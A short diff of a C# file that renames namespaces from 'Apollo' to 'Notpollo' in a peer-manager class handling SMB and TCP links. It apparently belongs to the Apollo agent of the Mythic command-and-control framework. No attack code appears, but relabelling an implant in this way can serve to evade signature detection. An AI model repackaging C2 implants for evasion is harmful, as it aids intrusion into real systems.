@@ -2,12 +2,12 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using Apollo.Peers.SMB;
-using Apollo.Peers.TCP;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using AI = ApolloInterop;
-namespace Apollo.Management.Peer
+using Notpollo.Peers.SMB;
+using Notpollo.Peers.TCP;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
+using AI = NotpolloInterop;
+namespace Notpollo.Management.Peer
 {
     public class PeerManager : AI.Classes.P2P.PeerManager
     {
